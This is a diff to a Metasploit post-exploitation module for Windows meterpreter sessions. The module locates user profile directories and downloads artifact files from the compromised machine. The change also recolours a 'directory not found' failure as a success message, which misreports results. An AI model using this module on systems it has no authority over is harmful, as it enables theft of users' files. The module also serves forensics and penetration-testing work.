@@ -23,17 +23,13 @@ class Metasploit3 < Msf::Post
         'License' => MSF_LICENSE,
         'Author' => [ 'Joshua Harper (@JonValt) <josh at radixtx dot com>'],
         'Platform' => %w{ win },
-        'SessionTypes' => [ 'meterpreter', 'shell' ]
+        'SessionTypes' => [ 'meterpreter' ]
       ))
-    register_advanced_options(
-      [
-        # Set as an advanced option since it can only be useful in shell sessions.
-        OptInt.new('TIMEOUT', [true ,'Timeout in seconds when downloading file on a shell session.', 120]),
-      ], self.class)
+    register_advanced_options([], self.class)
   end
 
   def run
-    print_status("Grabbing user profiles")
+    print_status("Gathering user profiles")
     grab_user_profiles.each do |userprofile|
       if check_artifact({
             :path=>userprofile['AppData'],
@@ -139,7 +135,7 @@ class Metasploit3 < Msf::Post
         return true
       end
     end
-    print_error("#{opts[:artifact_name]} directory not found for #{opts[:user]}")
+    print_good("#{opts[:artifact_name]} directory not found for #{opts[:user]}")
     return false
   end
  
@@ -147,14 +143,13 @@ class Metasploit3 < Msf::Post
     file = session.fs.file.search("#{opts[:profile]["#{opts[:path]}"]}\\#{opts[:artifact_dir]}","#{opts[:artifact_filename]}",true)
     file.each do |db|
       guid = db['path'].split ('\\')
+      # Using store_local for full control of output filename.  Forensics software can be picky about the files it's given.
       file_loc = store_local("artifact","#{opts[:artifact_filetype]}",session,"#{opts[:profile]['UserName']}_#{opts[:artifact_name]}_#{guid.last}_#{opts[:artifact_filename]}")
       maindb = "#{db['path']}#{session.fs.file.separator}#{db['name']}"
       print_status("Downloading #{maindb}")
       session.fs.file.download_file(file_loc,maindb)
       print_good("#{opts[:artifact_name]} artifact file saved to #{file_loc}")
-print_status("Hello from 'return file_loc'")
       return file_loc
-print_status("Hello from AFTER 'return file_loc'!")
     end
   end
 end
